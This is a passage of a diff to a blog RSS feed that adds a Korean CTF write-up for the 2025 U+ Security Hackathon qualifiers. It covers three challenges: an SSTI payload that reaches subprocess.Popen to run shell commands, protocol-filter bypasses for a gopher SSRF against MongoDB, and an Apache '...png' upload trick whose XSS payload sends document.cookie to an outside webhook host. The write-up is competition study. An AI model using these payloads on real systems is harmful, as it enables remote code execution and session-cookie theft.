@@ -1,4 +1,156 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>2025 YISF, HackQuest 후기</title><link>https://itznullbyte.github.io/posts/yisf_kaist_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/yisf_kaist_final/</guid><description> </description><pubDate>Tue, 09 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;이전에 썼던 Write-Up 글들을 보신분들은 알겠지만 이번에 열린 순천향대 정보보호 페스티벌, Kaist Hackquest 본선에 다녀왔습니다&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>2025 U+ Security Hackathon Quals Write-Up</title><link>https://itznullbyte.github.io/posts/uplus_hackathon/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/uplus_hackathon/</guid><description> </description><pubDate>Sun, 28 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Write-Up&lt;/h2&gt;
+&lt;h3&gt;compound interest&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./first.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;메모 기능에서 SSTI가 터져 RCE 할 수 있다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{{&quot;&quot;.__class__.__base__.__subclasses__()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;subclasses 나열시켜서 &lt;code&gt;subprocess.Popen&lt;/code&gt; 값 인덱스 찾은 다음에 플래그 읽어오면 된다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{{&quot;&quot;.__class__.__base__.__subclasses__()[382](&apos;cat flag.txt&apos;,shell=True,stdout=-1).communicate()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;lguplus2025{ece1436847b6ca03c17cfe98b30c5874de755373aa9ae16e2b32047c02dee73b}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;cowfarm&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;app.get(&quot;/flag&quot;, async (req, res) =&amp;gt; {
+  const { id } = req.query;
+  if (!id) {
+    return res.status(400).send(&quot;ID is required&quot;);
+  }
+  const cow = await Animal.findOne({ id });
+  if (!cow) {
+    return res.status(404).send(&quot;Cow not found&quot;);
+  }
+
+  if (cow.name !== &quot;cow&quot;) {
+    return res.status(400).send(&quot;Cow is not a cow&quot;);
+  }
+
+  if (cow.age !== 1) {
+    return res.status(400).send(&quot;Cow is not 1 year old&quot;);
+  }
+
+  if (cow.breed !== &quot;super_cow&quot;) {
+    return res.status(400).send(&quot;Cow is not a super cow&quot;);
+  }
+
+  res.send(`wow, you&apos;ve got a super cow!! here is your flag: ${process.env.FLAG}`);
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;DB에 있는 값이 다음 조건을 만족시키면 플래그를 얻을 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;app.get(&quot;/new_cow&quot;, async (req, res) =&amp;gt; {
+  const { name, age } = req.query;
+
+  if (!name) {
+    return res.status(400).send(&quot;Name is required&quot;);
+  }
+
+  if (!age) {
+    return res.status(400).send(&quot;Age is required&quot;);
+  }
+  try {
+    const id = crypto.randomUUID();
+    const cow = await Animal.create({ id: id, name: name, age: age, breed: &quot;cow&quot; });
+    return res.send(cow);
+  } catch (error) {
+    return res.status(500).send(&quot;Internal server error&quot;);
+  }
+
+})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;name&lt;/code&gt;과 &lt;code&gt;age&lt;/code&gt;는 임의로 설정할 수 있으나, &lt;code&gt;breed&lt;/code&gt;를 &lt;code&gt;super_cow&lt;/code&gt;로 만들긴 어려워보인다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;async function getUrlStatusCode(_url) {
+  return new Promise((resolve, reject) =&amp;gt; {
+    if (_url.toLowerCase().startsWith(&quot;gopher://&quot;) || _url.toLowerCase().startsWith(&quot;telnet://&quot;) || _url.toLowerCase().startsWith(&quot;file:&quot;)) {
+      reject(new Error(&quot;Protocol not allowed&quot;));
+      return;
+    }
+
+    const urlBuffer = Buffer.from(url.parse(_url).href);
+    
+    execFile(&quot;curl&quot;, [&quot;-w&quot;, &quot;%{http_code}&quot;, &quot;-o&quot;, &quot;/dev/null&quot;, &quot;-I&quot;, &quot;-L&quot;, urlBuffer], (error, stdout, stderr) =&amp;gt; {
+      if (error) {
+        reject(error);
+        return;
+      }
+
+      const result = stdout;
+      resolve(result);
+    });
+  });
+}
+
+app.get(&quot;/curl&quot;, async (req, res) =&amp;gt; {
+  const { url } = req.query;
+  if (!url) {
+    return res.status(400).send(&quot;URL is required&quot;);
+  }
+
+  try {
+    const code = await getUrlStatusCode(url);
+    return res.send(code);
+  } catch (error) {
+    console.error(error);
+    return res.status(500).send(&quot;Internal server error&quot;);
+  }
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;필터링을 적절히 우회해 Mongo DB SSRF를 성공시켜야한다.&lt;/p&gt;
+&lt;p&gt;다양한 우회방법들이 나왔는데&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;gopher:\\&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;(BLANK)gopher://&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;gopher:/&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;어느걸 쓰던 간단하게 우회할 수 있다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-L&lt;/code&gt; 플래그가 설정 되어 있다는 점을 통해 내 서버로 curl 요청 -&amp;gt; gopher로 리다이렉트 시켜보려했으나 잘 안 되었다.
+curl은 -L로 리다이렉트 될 때 처음 입력된 url의 scheme와 redirect 되는 scheme이 같은지 검증하는 절차를 거친다고 한다.&lt;/p&gt;
+&lt;p&gt;암튼 그래서 결과적으로는 &lt;code&gt;cow.breed&lt;/code&gt; 값을 수정하는 mongo db raw packet을 wireshark로 tcp dump 딴 후에 gopher로 ssrf 할 수 있었다고 한다.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=sVtRwp9R-_8&quot;&gt;2023 Dice CTF&lt;/a&gt;에서 비슷한 기법이 나왔었으니 참고하자&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;lguplus2025{4b0158738ba67e82f71d4c3242d89071}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;simple-image-viewer&lt;/h3&gt;
+&lt;p&gt;(본인은 못풀었으나) 간단한 트릭 문제였다.&lt;/p&gt;
+&lt;p&gt;apache로 돌아가는 Image Viewer 서비스다. 봇이 주어지는걸로 봐서 XSS 해야한다는걸 유추할 수 있다.&lt;/p&gt;
+&lt;p&gt;코드는 꽤 간단하다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;app.post(&apos;/upload&apos;, upload.single(&apos;image&apos;), (req, res) =&amp;gt; {
+  if (!req.file) {
+    return res.status(400).send(&apos;No file uploaded.&apos;);
+  }
+
+  if (req.file.size &amp;gt; 1024 * 1024) {
+    return res.status(400).send(&apos;File size is too large.&apos;);
+  }
+
+  if (![&apos;image/png&apos;, &apos;image/jpeg&apos;, &apos;image/gif&apos;].includes(req.file.mimetype)) {
+    return res.status(400).send(&apos;Invalid file type.&apos;);
+  }
+
+  //filename.filename.png
+  console.log(path.extname(req.file.filename))
+  console.log(path.extname(req.file.filename).slice(1))
+  if (![&apos;png&apos;, &apos;jpg&apos;, &apos;jpeg&apos;, &apos;gif&apos;].includes(path.extname(req.file.filename).slice(1))) {
+    return res.status(400).send(&apos;Invalid file extension.&apos;);
+  }
+
+  res.redirect(`/?image=${req.file.path}`);
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;문제 풀어본 사람들은 알겠지만 그냥 XSS 할 벡터가 안보인다.&lt;/p&gt;
+&lt;p&gt;취약점은 이미지 업로드에서 터진다&lt;/p&gt;
+&lt;p&gt;https://x.com/YNizry/status/1582733545759330306&lt;/p&gt;
+&lt;p&gt;해당 게시물에 따르면 apache는 이름이 &lt;code&gt;.&lt;/code&gt;으로만 되어있는 파일에 대해 Content-Type을 반환하지 않는다고 한다.&lt;/p&gt;
+&lt;p&gt;따라서 &lt;code&gt;...png&lt;/code&gt; 같은 이름으로 파일을 업로드하면 이미지로 로드되지 않고 파일 본문을 html로 포함하게 되어 XSS가 가능하다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;------WebKitFormBoundaryXWCDORG7efpmqeyr
+Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;...png&quot;
+Content-Type: image/png
+
+&amp;lt;script&amp;gt;location.href=&quot;https://ijvxjui.request.dreamhack.games?q=&quot;+document.cookie&amp;lt;/script&amp;gt;
+------WebKitFormBoundaryXWCDORG7efpmqeyr--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;그대로 제출하면 웹훅으로 플래그 날아온다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://3.36.14.255:3000/report?path=uploads/3f64fdf5-529b-4b00-94c2-e5b90819c473/...png&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./webhook.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;lguplus2025{50eb1bcbe258aff5e32155c406aa24df}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>2025 YISF, HackQuest 후기</title><link>https://itznullbyte.github.io/posts/yisf_kaist_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/yisf_kaist_final/</guid><description> </description><pubDate>Tue, 09 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;이전에 썼던 Write-Up 글들을 보신분들은 알겠지만 이번에 열린 순천향대 정보보호 페스티벌, Kaist Hackquest 본선에 다녀왔습니다&lt;/p&gt;
 &lt;p&gt;후기 적어보겠습니다&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h3&gt;2025 YISF&lt;/h3&gt;
